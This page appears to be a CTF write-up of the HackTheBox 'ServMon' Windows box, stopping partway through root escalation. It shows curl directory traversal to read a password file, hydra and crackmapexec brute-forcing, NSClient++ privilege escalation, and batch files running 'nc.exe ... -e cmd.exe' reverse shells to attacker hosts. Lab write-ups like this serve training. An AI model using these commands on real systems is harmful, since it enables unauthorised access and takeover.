@@ -1,0 +1,361 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="ServMon just retired on Hackthebox, it’s an easy difficulty Windows box. This was my first box ever being Windows based, it was quite new to me since I didn’t use Windows for the last 7 years. Nonet">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox - ServMon">
+<meta property="og:url" content="https://hg8.sh/posts/servmon/index.html">
+<meta property="og:site_name" content="hg8&#39;s Notes — My notes about infosec world. Pentest&#x2F;Bug Bounty&#x2F;CTF Writeups.">
+<meta property="og:description" content="ServMon just retired on Hackthebox, it’s an easy difficulty Windows box. This was my first box ever being Windows based, it was quite new to me since I didn’t use Windows for the last 7 years. Nonet">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/82759887-5612b580-9df0-11ea-9977-182cc0df149e.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/82762881-c70f9880-9e03-11ea-9f68-e7cf302ab5d0.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/82800515-227d6d00-9e7c-11ea-8553-a66ebdbe826e.png">
+<meta property="article:published_time" content="2020-06-19T22:00:00.000Z">
+<meta property="article:modified_time" content="2020-06-20T19:01:12.271Z">
+<meta property="article:author" content="hg8">
+<meta property="article:tag" content="ftp">
+<meta property="article:tag" content="windows">
+<meta property="article:tag" content="crackmapexec">
+<meta property="article:tag" content="ServMon">
+<meta property="article:tag" content="directory traversal">
+<meta property="article:tag" content="hydra">
+<meta property="article:tag" content="NSPClient">
+<meta property="article:tag" content="ssh tunnel">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://user-images.githubusercontent.com/9076747/82759887-5612b580-9df0-11ea-9977-182cc0df149e.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+     
+    <title>HackTheBox - ServMon :: hg8&#39;s Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups.</title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+    
+<meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="hg8's Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups." type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/posts/monteverde/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+    </span>
+    <br/>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#User-Flag"><span class="toc-number">1.</span> <span class="toc-text">User Flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon"><span class="toc-number">1.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FTP-anonymous-login"><span class="toc-number">1.2.</span> <span class="toc-text">FTP anonymous login</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TVT-NVMS-1000-Directory-Traversal"><span class="toc-number">1.3.</span> <span class="toc-text">TVT NVMS 1000 - Directory Traversal</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nadine-account-bruteforce"><span class="toc-number">1.4.</span> <span class="toc-text">Nadine account bruteforce</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SSH-brute-force"><span class="toc-number">1.4.1.</span> <span class="toc-text">SSH brute force</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SMB-bruteforce"><span class="toc-number">1.4.2.</span> <span class="toc-text">SMB bruteforce</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Root-FLag"><span class="toc-number">2.</span> <span class="toc-text">Root FLag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon-1"><span class="toc-number">2.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NSPClient-Privilege-Escalation"><span class="toc-number">2.2.</span> <span class="toc-text">NSPClient++ Privilege Escalation</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        <header id="header">
+  <a href="/">
+  
+      <div id="logo" style="background-image: url(/images/logo.webp);"></div>
+  
+    <span class="logo__mark"></span>
+    <span class="logo__text">./hg8.sh</span>
+    <span class="logo__cursor"></span>
+  </a>
+  <div id="nav">
+    <ul>
+      <li class="icon">
+        <a href="#"><i class="fas fa-bars fa-2x"></i></a>
+      </li>
+       
+        <li><a href="/">Home</a></li>
+       
+        <li><a href="/about/">About</a></li>
+       
+        <li><a href="/archives/">Posts</a></li>
+       
+        <li><a href="/search/">Search</a></li>
+      
+    </ul>
+  </div>
+</header>
+
+        
+          <br>
+          <br>
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        HackTheBox - ServMon
+    </h1>
+
+
+
+    <div class="meta"> 
+      
+    <div class="postdate">
+      
+        <time datetime="2020-06-19T22:00:00.000Z" itemprop="datePublished">20-06-2020</time>
+        
+      
+    </div>
+
+
+      — Written by 
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">hg8</span>
+      </span>
+      —
+      9 min read
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <img width="582" alt="servMon-hackthebox" src="https://user-images.githubusercontent.com/9076747/82759887-5612b580-9df0-11ea-9977-182cc0df149e.png">
+
+<p>ServMon just retired on Hackthebox, it’s an easy difficulty Windows box. This was my first box ever being Windows based, it was quite new to me since I didn’t use Windows for the last 7 years. Nonetheless it was good opportunity to learn a few new tricks by getting out of my confort zone.<br>Overall quite enjoyed this box which is -in my opinion- the perfect opportunity to start on Windows based boxes.</p>
+<p><strong>Tl;Dr:</strong> To get the user flag you had to retrieve a text file containing credentials by using a File Transversal vulnerability on a Network Surveillance software running on port 80. You then find a list of two users from an open FTP server. Using the credentials list found earlier you can brute-force one of the user (<code>Nadine</code>) password and grab the flag.<br>To get the root flag you had to exploit multiple vulnerabilities in <code>NSClient++</code> monitoring daemon to achieve Remote Code Execution as <code>root</code> and read the flag.</p>
+<p>Alright! Let’s get into the details now!</p>
+<hr>
+<p>First thing first, let’s add the box IP to the hosts file:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">"10.10.10.184 servmon.htb"</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>
+
+<p>and let’s start!</p>
+<h2 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><p>Let’s start with the classic <code>nmap</code> scan to see which ports are open on the box:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nmap -sV -sT -sC -p- servmon.htb</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-11 12:02 CEST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> servmon.htb (10.10.10.184)</span><br><span class="line">Host is up (0.027s latency).</span><br><span class="line">Not shown: 65508 closed ports</span><br><span class="line">PORT      STATE    SERVICE       VERSION</span><br><span class="line">21/tcp    open     ftp           Microsoft ftpd</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_01-18-20  12:05PM       &lt;DIR&gt;          Users</span><br><span class="line">22/tcp    open     ssh           OpenSSH for_Windows_7.7 (protocol 2.0)</span><br><span class="line">80/tcp    open     http</span><br><span class="line">|_http-title: Site doesn<span class="string">'t have a title (text/html).</span></span><br><span class="line"><span class="string">445/tcp   open     microsoft-ds?</span></span><br><span class="line"><span class="string">8443/tcp  open     ssl/https-alt</span></span><br><span class="line"><span class="string">|_ http-title: NSClient++</span></span><br></pre></td></tr></table></figure>
+
+<p>We have two web app running on port 80 and 8443, SMB on port 445, the FTP port 21 and finally the SSH port 22 open.</p>
+<h3 id="FTP-anonymous-login"><a href="#FTP-anonymous-login" class="headerlink" title="FTP anonymous login"></a>FTP anonymous login</h3><p><code>nmap</code> indicate that anonymous login is possible on the FTP server running on 21. It also shows that there is an <code>Users</code> directory inside. Looks quite promising. </p>
+<p>Let’s take a look by ourselves:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ftp servmon.htb</span><br><span class="line">Connected to servmon.htb.</span><br><span class="line">220 Microsoft FTP Service</span><br><span class="line">Name (servmon.htb:hg8): anonymous</span><br><span class="line">331 Anonymous access allowed.</span><br><span class="line">Password:</span><br><span class="line">230 User logged <span class="keyword">in</span>.</span><br><span class="line">Remote system <span class="built_in">type</span> is Windows_NT.</span><br><span class="line">ftp&gt; ls</span><br><span class="line">200 PORT <span class="built_in">command</span> successful.</span><br><span class="line">125 Data connection already open; Transfer starting.</span><br><span class="line">01-18-20  12:05PM       &lt;DIR&gt;          Users</span><br><span class="line">226 Transfer complete.</span><br><span class="line">ftp&gt; quit</span><br></pre></td></tr></table></figure>
+
+<p>Alright, since we have enough permission let’s download the whole <code>Users</code> folder to browse the content more easily:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ wget -r ftp://anonymous:@servmon.htb/</span><br><span class="line">[hg8@archbook ~]$ tree servmon.htb</span><br><span class="line">servmon.htb</span><br><span class="line">└── Users</span><br><span class="line">    ├── Nadine</span><br><span class="line">    │   └── Confidential.txt</span><br><span class="line">    └── Nathan</span><br><span class="line">        └── Notes to do.txt</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ cat <span class="string">"servmon.htb/Users/Nathan/Notes to do.txt"</span></span><br><span class="line">1) Change the password <span class="keyword">for</span> NVMS - Complete</span><br><span class="line">2) Lock down the NSClient Access - Complete</span><br><span class="line">3) Upload the passwords</span><br><span class="line">4) Remove public access to NVMS</span><br><span class="line">5) Place the secret files <span class="keyword">in</span> SharePoint%</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ cat servmon.htb/Users/Nadine/Confidential.txt</span><br><span class="line">Nathan,</span><br><span class="line"></span><br><span class="line">I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.</span><br><span class="line"></span><br><span class="line">Regards</span><br><span class="line"></span><br><span class="line">Nadine%</span><br></pre></td></tr></table></figure>
+
+<p>That’s interesting, according to Nadine there is a <code>Passwords.txt</code> file on Nathan <code>Desktop</code>. Let’s keep that in mind for later, it will probably come useful.</p>
+<p>Now that we are done for the FTP Server let’s move on to the port 80.</p>
+<h3 id="TVT-NVMS-1000-Directory-Traversal"><a href="#TVT-NVMS-1000-Directory-Traversal" class="headerlink" title="TVT NVMS 1000 - Directory Traversal"></a>TVT NVMS 1000 - Directory Traversal</h3><p>Opening <a href="http://servom.htb" target="_blank" rel="noopener">http://servom.htb</a> display a following login page:</p>
+<img width="846" alt="servmon TVT NVMS login" src="https://user-images.githubusercontent.com/9076747/82762881-c70f9880-9e03-11ea-9f68-e7cf302ab5d0.png">
+
+<p>That’s an uncommon login page. A quick Google Search on <code>NVMS-1000</code> gives us the following information :</p>
+<blockquote>
+<p>NVMS-1000 is a monitoring client which is specially designed for network video surveillance.</p>
+<p><a href="http://en.tvt.net.cn/products/188.html" target="_blank" rel="noopener">http://en.tvt.net.cn/products/188.html</a></p>
+</blockquote>
+<p>As with all obscure softwares let’s check if any public exploit is available.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ searchsploit <span class="string">"TVT NVMS 1000"</span></span><br><span class="line">------------------------------------------------------------ ----------------------------------------</span><br><span class="line"> Exploit Title                                              |  Path</span><br><span class="line">                                                            | (/usr/share/exploitdb/)</span><br><span class="line">------------------------------------------------------------ ----------------------------------------</span><br><span class="line">TVT NVMS 1000 - Directory Traversal                         | exploits/hardware/webapps/48311.py</span><br><span class="line">------------------------------------------------------------ ----------------------------------------</span><br><span class="line">Shellcodes: No Results</span><br></pre></td></tr></table></figure>
+
+<p>That sound perfect for what we need.</p>
+<p>Given the informations we got earlier we can probably retrieve the <code>Passwords.txt</code> file Nadine was talking about using this Directory Traversal vulnerability. </p>
+<p>Reading the exploit code shows that we have to go back 12 levels to get to the root path. Let’s give it a try to retrieve the file located in <code>/Users/Nathan/Desktop/</code> (according to Nadine note):</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl -i --path-as-is <span class="string">"http://servmon.htb/../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt"</span> </span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-type: text/plain</span><br><span class="line">Content-Length: 156</span><br><span class="line">Connection: close</span><br><span class="line">AuthInfo:</span><br><span class="line"></span><br><span class="line">1nsp3ctTh3Way2Mars!</span><br><span class="line">Th3r34r3To0M4nyTrait0r5!</span><br><span class="line">B3WithM30r4ga1n5tMe</span><br><span class="line">L1k3B1gBut7s@W0rk</span><br><span class="line">0nly7h3y0unGWi11F0l10w</span><br><span class="line">IfH3s4b0Utg0t0H1sH0me</span><br><span class="line">Gr4etN3w5w17hMySk1Pa5$%</span><br></pre></td></tr></table></figure>
+
+<p>We got a few password</p>
+<h3 id="Nadine-account-bruteforce"><a href="#Nadine-account-bruteforce" class="headerlink" title="Nadine account bruteforce"></a>Nadine account bruteforce</h3><h4 id="SSH-brute-force"><a href="#SSH-brute-force" class="headerlink" title="SSH brute force"></a>SSH brute force</h4><p>Since SSH is open maybe one of this password will be working for <code>Nathan</code> user. Let’s use <code>hydra</code> to try brute forcing it:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ hydra -l Nathan -P Passwords.txt 10.10.10.184 ssh</span><br><span class="line">Hydra v9.0 (c) 2019 by van Hauser/THC</span><br><span class="line">[DATA] max 4 tasks per 1 server, overall 4 tasks, 7 login tries (l:1/p:7), ~2 tries per task</span><br><span class="line">[DATA] attacking ssh://10.10.10.184:22/</span><br><span class="line">1 of 1 target completed, 0 valid passwords found</span><br></pre></td></tr></table></figure>
+
+<p>No luck but it’s maybe worth trying on <code>Nadine</code> account:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ hydra -l Nadine -P Passwords.txt 10.10.10.184 ssh</span><br><span class="line">Hydra v9.0 (c) 2019 by van Hauser/THC</span><br><span class="line">[DATA] max 4 tasks per 1 server, overall 4 tasks, 7 login tries (l:1/p:7), ~2 tries per task</span><br><span class="line">[DATA] attacking ssh://10.10.10.184:22/</span><br><span class="line">[22][ssh] host: 10.10.10.184   login: Nadine   password: L1k3B1gBut7s@W0rk</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br></pre></td></tr></table></figure>
+
+<p>Alright we got Nadine account password: “LikeBigButts at Work”…? Well ok why not :P </p>
+<h4 id="SMB-bruteforce"><a href="#SMB-bruteforce" class="headerlink" title="SMB bruteforce"></a>SMB bruteforce</h4><p>Since the SMB port 445 is open it was also possible to brute-force using this entry point. For this one I will use <a href="https://github.com/byt3bl33d3r/CrackMapExec" target="_blank" rel="noopener"> <code>crackmapexec</code></a>:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ crackmapexec smb 10.10.10.184 -u Nadine -p Passwords.txt</span><br><span class="line">SMB  10.10.10.184    445    SERVMON  [*] Windows 10.0 Build 18362 (name:SERVMON) (domain:ServMon) (signing:False) (SMBv1:False)</span><br><span class="line">SMB  10.10.10.184    445    SERVMON  [-] ServMon\Nadine:1nsp3ctTh3Way2Mars! STATUS_LOGON_FAILURE</span><br><span class="line">SMB  10.10.10.184    445    SERVMON  [-] ServMon\Nadine:Th3r34r3To0M4nyTrait0r5! STATUS_LOGON_FAILURE</span><br><span class="line">SMB  10.10.10.184    445    SERVMON  [-] ServMon\Nadine:B3WithM30r4ga1n5tMe STATUS_LOGON_FAILURE</span><br><span class="line">SMB  10.10.10.184    445    SERVMON  [+] ServMon\Nadine:L1k3B1gBut7s@W0rk</span><br></pre></td></tr></table></figure>
+
+<p>Once again we got Nadine account credentials.</p>
+<p>We can now connect to Nadine account trough SSH and grab the flag:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh Nadine@servmon.htb</span><br><span class="line">Nadine@servmon.htb<span class="string">'s password: </span></span><br><span class="line"><span class="string">Microsoft Windows [Version 10.0.18363.752]</span></span><br><span class="line"><span class="string">(c) 2019 Microsoft Corporation. All rights reserved.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">nadine@SERVMON C:\Users\Nadine&gt;type Desktop\user.txt</span></span><br><span class="line"><span class="string">6xxxxxxxxxxxxxxxxxxxxxxxe</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Root-FLag"><a href="#Root-FLag" class="headerlink" title="Root FLag"></a>Root FLag</h2><h3 id="Recon-1"><a href="#Recon-1" class="headerlink" title="Recon"></a>Recon</h3><p>So far we didn’t even need to look at what’s is running on port <code>8443</code>. Since nothing is left at random on HackTheBox that’s probably our entry point to root.</p>
+<p>Opening <a href="http://servom.htb:8443" target="_blank" rel="noopener">http://servom.htb:8443</a> display a following page: </p>
+<img width="1036" alt="Screenshot 2020-05-25 at 11 37 32" src="https://user-images.githubusercontent.com/9076747/82800515-227d6d00-9e7c-11ea-8553-a66ebdbe826e.png">
+
+<p>The web interface is really buggy and nothing can be done from there. I don’t know if it’s intended or not but anyway let’s move on.</p>
+<p>Out of curiosity let’s check on <code>searchsploit</code> if any vulnerabilities are available for this <code>NSClient++</code> tool:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ searchsploit nsclient</span><br><span class="line">----------------------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                                             |  Path</span><br><span class="line">                                                           | (/usr/share/exploitdb/)</span><br><span class="line">----------------------------------------------------------- ----------------------------------------</span><br><span class="line">NSClient++ 0.5.2.35 - Authenticated Remote Code Execution  | exploits/json/webapps/48360.txt</span><br><span class="line">NSClient++ 0.5.2.35 - Privilege Escalation                 | exploits/windows/<span class="built_in">local</span>/46802.txt</span><br><span class="line">----------------------------------------------------------- ----------------------------------------</span><br><span class="line">Shellcodes: No Results</span><br></pre></td></tr></table></figure>
+
+<p>Navigating to the <code>NSPClient++</code> folder allows to confirm the version running is vulnerable:</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Program Files\NSClient++&gt; .\nscp -<span class="literal">-version</span></span><br><span class="line">NSClient++, Version: <span class="number">0.5</span>.<span class="number">2.35</span> <span class="number">2018</span><span class="literal">-01</span><span class="literal">-28</span>, Platform: x64</span><br></pre></td></tr></table></figure>
+
+<p>We are going to skip the <code>Authenticated Remote Code Execution</code> since, well, we already have code execution on the machine as <code>Nadine</code>.<br>But the <code>Privilege Escalation</code> looks exactly what we need to get to <code>root</code>. Let’s take a look at it:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ cat /usr/share/exploitdb/exploits/windows/<span class="built_in">local</span>/46802.txt</span><br><span class="line">Exploit Title: NSClient++ 0.5.2.35 - Privilege Escalation</span><br><span class="line"></span><br><span class="line">Details:</span><br><span class="line">When NSClient++ is installed with Web Server enabled, <span class="built_in">local</span> low privilege users have the ability to <span class="built_in">read</span> the web administator<span class="string">'s password in cleartext from the configuration file. From here a user is able to login to the web server and make changes to the configuration file that is normally restricted.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The user is able to enable the modules to check external scripts and schedule those scripts to run.  There doesn'</span>t seem to be restrictions on <span class="built_in">where</span> the scripts are called from, so the user can create the script anywhere. Since the NSClient++ Service runs as Local System, these scheduled scripts run as that user and the low privilege user can gain privilege escalation.  </span><br><span class="line"></span><br><span class="line">Exploit:</span><br><span class="line">1. Grab web administrator password</span><br><span class="line">- run the following that is instructed when you select forget password</span><br><span class="line">        C:\Program Files\NSClient++&gt;nscp web -- password --display</span><br><span class="line">        Current password: SoSecret</span><br><span class="line"></span><br><span class="line">2. Login and <span class="built_in">enable</span> following modules including <span class="built_in">enable</span> at startup and save configuration</span><br><span class="line">- CheckExternalScripts</span><br><span class="line">- Scheduler</span><br><span class="line"></span><br><span class="line">3. Download nc.exe and evil.bat to c:\temp from attacking machine</span><br><span class="line">        @<span class="built_in">echo</span> off</span><br><span class="line">        c:\temp\nc.exe 192.168.0.163 443 -e cmd.exe</span><br><span class="line"></span><br><span class="line">4. Setup listener on attacking machine</span><br><span class="line">        nc -nlvvp 443</span><br><span class="line"></span><br><span class="line">5. Add script foobar to call evil.bat and save settings</span><br><span class="line">- Settings &gt; External Scripts &gt; Scripts</span><br><span class="line">- Add New</span><br><span class="line">        - foobar</span><br><span class="line">                <span class="built_in">command</span> = c:\temp\evil.bat</span><br><span class="line"></span><br><span class="line">6. Add schedulede to call script every 1 minute and save settings</span><br><span class="line">- Settings &gt; Scheduler &gt; Schedules</span><br><span class="line">- Add new</span><br><span class="line">        - foobar</span><br><span class="line">                interval = 1m</span><br><span class="line">                <span class="built_in">command</span> = foobar</span><br></pre></td></tr></table></figure>
+
+<p>Sounds really good, we have the detailed exploit procedure. One problem remains, most of the configuration needed in order to setup the exploit require access to the Web Interface. Unfortunately this interface is <em>completely</em> buggy and unstable (at least when I was working on it), so we need to find a way to access the same feature but without using the Web Interface.</p>
+<p>After reading the documentation a little I am confident it should be possible to do so only using the API and the <code>nscp</code> client.<br>Alright let’s get into it!</p>
+<h3 id="NSPClient-Privilege-Escalation"><a href="#NSPClient-Privilege-Escalation" class="headerlink" title="NSPClient++ Privilege Escalation"></a>NSPClient++ Privilege Escalation</h3><p>First we need to retrieve the admin account password. Let’s use <code>nspd</code> client to do so:</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Program Files\NSClient++&gt; .\nscp web -- password -<span class="literal">-display</span></span><br><span class="line">Current password: ew2x6SsGTxjRwXOT</span><br></pre></td></tr></table></figure>
+
+<p>Then let’s activate <code>CheckExternalScripts</code> module:</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Program Files\NSClient++&gt; .\nscp settings -<span class="literal">-activate</span><span class="literal">-module</span> CheckExternalScripts</span><br><span class="line">E   schedule WE need wither duration or schedule: foobar[<span class="number">1936159329</span>] = &#123;tpl: &#123;alias: foobar, path: /s</span><br><span class="line">ettings/scheduler/schedules/foobar, is_tpl: false, parent: default, value: command = foobar, options</span><br><span class="line">: &#123; &#125; &#125;, command: command, channel: NSCA, source_id: , target_id: &#125;</span><br></pre></td></tr></table></figure>
+
+<p>Now let’s download a Windows version of <code>netcat</code> and create our <code>.bat</code> reverse-shell script:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ wget https://github.com/int0x33/nc.exe/raw/master/nc.exe</span><br><span class="line">[hg8@archbook ~]$ cat hg8.bat</span><br><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line">C:\Temp\nc.exe 10.10.10.10 8585 -e cmd.exe</span><br></pre></td></tr></table></figure>
+
+<p>Using a <code>scp</code> we can send <code>nc.exe</code> to the box <code>C:\Temp</code> folder:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ scp nc.exe Nadine@servmon.htb:C:/Temp</span><br><span class="line">Nadine@servmon.htb<span class="string">'s password:</span></span><br><span class="line"><span class="string">nc.exe                          100%   38KB 442.0KB/s   00:00</span></span><br></pre></td></tr></table></figure>
+
+<p>Let’s make sure it’s been sent correctly:</p>
